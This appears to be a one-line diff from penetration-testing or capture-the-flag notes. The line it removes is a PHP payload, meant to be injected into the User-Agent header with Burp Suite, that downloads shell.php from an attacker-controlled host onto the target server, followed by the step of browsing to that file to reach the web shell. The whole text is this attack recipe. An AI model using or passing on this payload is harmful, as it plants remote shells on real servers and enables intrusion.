@@ -1,1 +1,0 @@
-<?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php'))?> --> insert in user agent in burpsuite and access this file using http://<ip>/shell.php
